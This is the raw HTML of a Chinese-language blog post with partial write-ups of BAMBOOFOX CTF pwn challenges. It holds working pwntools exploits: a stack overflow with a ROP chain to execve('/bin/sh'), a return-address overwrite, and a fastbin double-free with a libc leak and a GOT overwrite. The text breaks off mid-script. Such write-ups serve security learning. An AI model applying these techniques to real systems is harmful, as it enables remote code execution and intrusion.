@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="网址:http://ctf.bamboofox.cs.nctu.edu.tw/challenges 听说是他们的新生赛,毕竟我已经好几个月没打CTF了,赶紧去练习练习.(然后发现一堆不会做…..  pwnwater-impossible 50简单的变量覆盖. 1pay = &amp;apos;a&amp;apos;*28+p64(6666) flag:BAMBOOFOX{Pwnnnnnnnning_1s_sImP">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BAMBOOFOX CTF 部分 writeup">
+<meta property="og:url" content="https://veritas501.github.io/2018/02/10/BAMBOOFOX CTF 部分 writeup/index.html">
+<meta property="og:site_name" content="Veritas501&#39;s Blog">
+<meta property="og:description" content="网址:http://ctf.bamboofox.cs.nctu.edu.tw/challenges 听说是他们的新生赛,毕竟我已经好几个月没打CTF了,赶紧去练习练习.(然后发现一堆不会做…..  pwnwater-impossible 50简单的变量覆盖. 1pay = &amp;apos;a&amp;apos;*28+p64(6666) flag:BAMBOOFOX{Pwnnnnnnnning_1s_sImP">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-02-10T15:11:03.728Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BAMBOOFOX CTF 部分 writeup">
+<meta name="twitter:description" content="网址:http://ctf.bamboofox.cs.nctu.edu.tw/challenges 听说是他们的新生赛,毕竟我已经好几个月没打CTF了,赶紧去练习练习.(然后发现一堆不会做…..  pwnwater-impossible 50简单的变量覆盖. 1pay = &amp;apos;a&amp;apos;*28+p64(6666) flag:BAMBOOFOX{Pwnnnnnnnning_1s_sImP">
+
+
+
+
+
+
+  <link rel="canonical" href="https://veritas501.github.io/2018/02/10/BAMBOOFOX CTF 部分 writeup/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>BAMBOOFOX CTF 部分 writeup | Veritas501's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Veritas501's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-guestbook">
+    <a href="/Guestbook" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-pencil"></i> <br />guestbook</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://veritas501.github.io/2018/02/10/BAMBOOFOX CTF 部分 writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Veritas501">
+      <meta itemprop="description" content="开始踏上Re&Pwn之路...">
+      <meta itemprop="image" content="/images/215.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veritas501's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BAMBOOFOX CTF 部分 writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-02-10 00:00:00 / Modified: 23:11:03" itemprop="dateCreated datePublished" datetime="2018-02-10T00:00:00+08:00">2018-02-10</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/02/10/BAMBOOFOX CTF 部分 writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/10/BAMBOOFOX CTF 部分 writeup/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/02/10/BAMBOOFOX CTF 部分 writeup/" class="leancloud_visitors" data-flag-title="BAMBOOFOX CTF 部分 writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>网址:<a href="http://ctf.bamboofox.cs.nctu.edu.tw/challenges" target="_blank" rel="noopener">http://ctf.bamboofox.cs.nctu.edu.tw/challenges</a></p>
+<p>听说是他们的新生赛,毕竟我已经好几个月没打CTF了,赶紧去练习练习.(然后发现一堆不会做…..</p>
+<hr>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="water-impossible-50"><a href="#water-impossible-50" class="headerlink" title="water-impossible 50"></a>water-impossible 50</h2><p>简单的变量覆盖.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = &apos;a&apos;*28+p64(6666)</span><br></pre></td></tr></table></figure>
+<p>flag:<code>BAMBOOFOX{Pwnnnnnnnning_1s_sImP13_and_Int3r3stIngggg}</code></p>
+<h2 id="infant-gogogo-180"><a href="#infant-gogogo-180" class="headerlink" title="infant-gogogo 180"></a>infant-gogogo 180</h2><p>突然感觉难度陡增有木有,居然上了一道用golang写的.好在溢出非常暴力,不是很难(不知道是不是正解</p>
+<p>上来就让你输入,测试了一下有溢出,溢出长度为0x100.然后能够覆盖ret地址,接着就能rop了.</p>
+<p>程序是静态编译,本能想着去找ropchain,然而无果.只能自己写了.无奈</p>
+<p>ROPgadget搜了一下,连续的pop没有,不过倒是有很多<code>add rsp,xx;ret</code>的可以代替,不知道是不是golang编译的特点.</p>
+<p>因为是静态编译,就没有plt之类的了.从他程序里面的函数找,我找到两个好用的.一个是<code>runtime_read</code>,作用相当于read.另一个是<code>syscall_Syscall</code>,相当于能够执行任意的syscall.</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">'./infant-gogogo'</span>)</span><br><span class="line">	bin = ELF(<span class="string">'./infant-gogogo'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="number">58795</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line">runtime_read = <span class="number">0x0000000000452140</span></span><br><span class="line">main = <span class="number">0x00000000004520A0</span></span><br><span class="line">add_rsp_ret=<span class="number">0x0000000000401762</span><span class="comment">#0x000000000040a520 : add rsp, 0x20 ; ret</span></span><br><span class="line">syscall_Syscall = <span class="number">0x0000000000462980</span></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">pay += p64(runtime_read) +p64(add_rsp_ret) +p64(<span class="number">0</span>)+p64(<span class="number">0x54fff0</span>)+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(syscall_Syscall) +p64(add_rsp_ret) +p64(<span class="number">59</span>)+p64(<span class="number">0x54fff0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000452140 ; void __cdecl runtime_read()</span></span><br><span class="line"><span class="string">.text:0000000000452140                 public runtime_read</span></span><br><span class="line"><span class="string">.text:0000000000452140 runtime_read    proc near               ; CODE XREF: runtime_sysargs+1EE↑p</span></span><br><span class="line"><span class="string">.text:0000000000452140                                         ; runtime_getRandomData+E2↑p</span></span><br><span class="line"><span class="string">.text:0000000000452140</span></span><br><span class="line"><span class="string">.text:0000000000452140 fd              = qword ptr  8</span></span><br><span class="line"><span class="string">.text:0000000000452140 buf             = qword ptr  10h</span></span><br><span class="line"><span class="string">.text:0000000000452140 count           = qword ptr  18h</span></span><br><span class="line"><span class="string">.text:0000000000452140 arg_18          = dword ptr  20h</span></span><br><span class="line"><span class="string">.text:0000000000452140</span></span><br><span class="line"><span class="string">.text:0000000000452140                 mov     edi, dword ptr [rsp+fd] ; fd</span></span><br><span class="line"><span class="string">.text:0000000000452144                 mov     rsi, [rsp+buf]  ; buf</span></span><br><span class="line"><span class="string">.text:0000000000452149                 mov     edx, dword ptr [rsp+count] ; count</span></span><br><span class="line"><span class="string">.text:000000000045214D                 xor     eax, eax</span></span><br><span class="line"><span class="string">.text:000000000045214F                 syscall                 ; LINUX - sys_read</span></span><br><span class="line"><span class="string">.text:0000000000452151                 cmp     rax, 0FFFFFFFFFFFFF001h</span></span><br><span class="line"><span class="string">.text:0000000000452157                 jbe     short loc_45215E</span></span><br><span class="line"><span class="string">.text:0000000000452159                 mov     eax, 0FFFFFFFFh</span></span><br><span class="line"><span class="string">.text:000000000045215E</span></span><br><span class="line"><span class="string">.text:000000000045215E loc_45215E:                             ; CODE XREF: runtime_read+17↑j</span></span><br><span class="line"><span class="string">.text:000000000045215E                 mov     [rsp+arg_18], eax</span></span><br><span class="line"><span class="string">.text:0000000000452162                 retn</span></span><br><span class="line"><span class="string">.text:0000000000452162 runtime_read    endp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000462980 ; void __cdecl syscall_Syscall()</span></span><br><span class="line"><span class="string">.text:0000000000462980                 public syscall_Syscall</span></span><br><span class="line"><span class="string">.text:0000000000462980 syscall_Syscall proc near               ; CODE XREF: syscall_Close+45↑p</span></span><br><span class="line"><span class="string">.text:0000000000462980                                         ; syscall_fcntl+47↑p ...</span></span><br><span class="line"><span class="string">.text:0000000000462980</span></span><br><span class="line"><span class="string">.text:0000000000462980 arg_0           = qword ptr  8</span></span><br><span class="line"><span class="string">.text:0000000000462980 dummy           = dword ptr  10h</span></span><br><span class="line"><span class="string">.text:0000000000462980 arg_10          = qword ptr  18h</span></span><br><span class="line"><span class="string">.text:0000000000462980 arg_18          = qword ptr  20h</span></span><br><span class="line"><span class="string">.text:0000000000462980 arg_20          = qword ptr  28h</span></span><br><span class="line"><span class="string">.text:0000000000462980 arg_28          = qword ptr  30h</span></span><br><span class="line"><span class="string">.text:0000000000462980 arg_30          = qword ptr  38h</span></span><br><span class="line"><span class="string">.text:0000000000462980</span></span><br><span class="line"><span class="string">.text:0000000000462980                 call    runtime_entersyscall</span></span><br><span class="line"><span class="string">.text:0000000000462985                 mov     rdi, qword ptr [rsp+dummy] ; dummy</span></span><br><span class="line"><span class="string">.text:000000000046298A                 mov     rsi, [rsp+arg_10]</span></span><br><span class="line"><span class="string">.text:000000000046298F                 mov     rdx, [rsp+arg_18]</span></span><br><span class="line"><span class="string">.text:0000000000462994                 xor     r10d, r10d</span></span><br><span class="line"><span class="string">.text:0000000000462997                 xor     r8d, r8d</span></span><br><span class="line"><span class="string">.text:000000000046299A                 xor     r9d, r9d</span></span><br><span class="line"><span class="string">.text:000000000046299D                 mov     rax, [rsp+arg_0]</span></span><br><span class="line"><span class="string">.text:00000000004629A2                 syscall                 ; LINUX -</span></span><br><span class="line"><span class="string">.text:00000000004629A4                 cmp     rax, 0FFFFFFFFFFFFF001h</span></span><br><span class="line"><span class="string">.text:00000000004629AA                 jbe     short loc_4629CC</span></span><br><span class="line"><span class="string">.text:00000000004629AC                 mov     [rsp+arg_20], 0FFFFFFFFFFFFFFFFh</span></span><br><span class="line"><span class="string">.text:00000000004629B5                 mov     [rsp+arg_28], 0</span></span><br><span class="line"><span class="string">.text:00000000004629BE                 neg     rax</span></span><br><span class="line"><span class="string">.text:00000000004629C1                 mov     [rsp+arg_30], rax</span></span><br><span class="line"><span class="string">.text:00000000004629C6                 call    runtime_exitsyscall</span></span><br><span class="line"><span class="string">.text:00000000004629CB                 retn</span></span><br><span class="line"><span class="string">.text:00000000004629CC ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">.text:00000000004629CC</span></span><br><span class="line"><span class="string">.text:00000000004629CC loc_4629CC:                             ; CODE XREF: syscall_Syscall+2A↑j</span></span><br><span class="line"><span class="string">.text:00000000004629CC                 mov     [rsp+arg_20], rax</span></span><br><span class="line"><span class="string">.text:00000000004629D1                 mov     [rsp+arg_28], rdx</span></span><br><span class="line"><span class="string">.text:00000000004629D6                 mov     [rsp+arg_30], 0</span></span><br><span class="line"><span class="string">.text:00000000004629DF                 call    runtime_exitsyscall</span></span><br><span class="line"><span class="string">.text:00000000004629E4                 retn</span></span><br><span class="line"><span class="string">.text:00000000004629E4 syscall_Syscall endp</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<p>flag:<code>BAMBOOFOX{G0LaNg_iS_aw3s0m3ls!}</code></p>
+<h2 id="infant-gotoheaven-255"><a href="#infant-gotoheaven-255" class="headerlink" title="infant-gotoheaven 255"></a>infant-gotoheaven 255</h2><p>做完这题我开始怀疑我上一题是不是做复杂了(反思</p>
+<p>这题和上一题同样是go,但是简单好多啊</p>
+<p>还是有一个暴力的栈溢出,然后给了一个叫<code>main_weird</code>的函数,正常不可达到,进去就给你一个shell.</p>
+<p>所以修改ret地址到这里即可.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">'./infant-gotoheaven'</span>)</span><br><span class="line">	bin = ELF(<span class="string">'./infant-gotoheaven'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span> ,<span class="number">58796</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x00000000004A263F</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(pay)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag:<code>BAMBOOFOX{GOLANG_PWnnnnnnnIng_iS_r3A11Y_W3iRdO_O}</code></p>
+<h2 id="MagicBook-455"><a href="#MagicBook-455" class="headerlink" title="MagicBook 455"></a>MagicBook 455</h2><p>delete函数中,free时没有检测指针是否非NULL,free完也没有清空指针.导致可以double free.</p>
+<p>这边我使用freebin dup来做.</p>
+<p>利用freebin dup到got前面附近,leak出free的地址,算出system地址.</p>
+<p>再次利用freebin dup到got前面负荆,修改free为system.从而get shell.</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">'./MagicBook'</span>)</span><br><span class="line">	bin = ELF(<span class="string">'./MagicBook'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="number">58798</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6-14c22be9aa11316f89909e4237314e009da38883'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_chant</span><span class="params">(idx,length,con)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">"want to use :"</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line">	cn.recvuntil(<span class="string">'your chant :'</span>)</span><br><span class="line">	cn.sendline(str(length))</span><br><span class="line">	cn.recvuntil(<span class="string">'your chant :'</span>)</span><br><span class="line">	cn.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">"want to use :"</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spell</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">"want to use :"</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add_chant(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'aaaaaaaaaa'</span>)</span><br><span class="line">add_chant(<span class="number">1</span>,<span class="number">0x50</span>,<span class="string">'bbbbbbbbbb'</span>)</span><br><span class="line">add_chant(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">'bbbbbbbbbb'</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#z('b*0x0000000000400981\nc')</span></span><br><span class="line">pay = p64(<span class="number">0x602002</span><span class="number">-8</span>)</span><br><span class="line">add_chant(<span class="number">0</span>,<span class="number">0x50</span>,pay)</span><br><span class="line">add_chant(<span class="number">1</span>,<span class="number">0x50</span>,<span class="string">'asdasd'</span>)</span><br><span class="line">add_chant(<span class="number">2</span>,<span class="number">0x50</span>,<span class="string">'asdasd'</span>)</span><br><span class="line">add_chant(<span class="number">3</span>,<span class="number">0x50</span>,<span class="string">'1'</span>*<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">spell(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'1'</span>*<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(cn.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc_base))</span><br><span class="line">system = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span 